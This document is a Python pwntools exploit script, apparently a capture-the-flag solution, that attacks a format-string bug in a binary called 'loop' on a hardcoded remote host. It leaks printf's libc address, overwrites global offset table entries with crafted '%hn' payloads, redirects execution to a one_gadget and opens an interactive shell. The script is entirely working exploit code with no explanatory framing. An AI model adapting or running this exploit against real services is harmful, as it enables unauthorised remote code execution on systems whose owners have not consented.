from pwn import *
local = 0
if local:
    s = process("./loop")
    raw_input('debug')
    # context.log_level="DEBUG"
    printf_off = 0x55810
    system_off = 0x453a0
else:
    s = remote("45.77.38.41", 5556)
    libc = ELF('./libc.so.6')
    printf_off = libc.symbols['printf']
    system_off = libc.symbols['system']

def twoLowBytes(addr):
	return addr&0xffff
def twoHighBytes(addr):
    return addr>>16&0xffff
log.info("printf_off: 0x%x"%printf_off)
puts_got = 0x601018
printf_got = 0x601028
payload = '%15$s_'
payload += "%"
payload += str(0x805-7)
payload += "x%16$hn"
payload = payload.ljust(24,'a')
payload += p64(printf_got) #15
payload += p64(puts_got)  #16
s.sendlineafter("What's your name? ", payload)
s.recvuntil("Hello ")
printf_libc = u64(s.recv(6)+'\x00'*2)
log.info("printf_libc: 0x%x"%printf_libc)
libc_base = printf_libc-printf_off
log.info("libc_base: 0x%x"%libc_base)
# ============ exploit using one_gadget ===============
# system_libc = libc_base + system_off
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_call = one_gadget[0] + libc_base
log.info("one_call: 0x%x"%one_call)
lbyte = twoLowBytes(one_call)
hbyte = twoHighBytes(one_call)
print(str(lbyte)+"|"+str(hbyte))
if lbyte > hbyte:
    payload2 = '%'+str(hbyte)+"x%17$hn"
    payload2 += '%'+str(lbyte-hbyte)+'x%16$hn'
else:
    payload2 = '%'+str(lbyte)+"x%16$hn"
    payload2 += '%'+str(hbyte-lbyte)+'x%17$hn'
payload2 = payload2.ljust(32,'a')
payload2 += p64(printf_got) #16
payload2 += p64(printf_got+2) #17
s.sendlineafter("What's your name? ", payload2)


s.interactive()
s.close()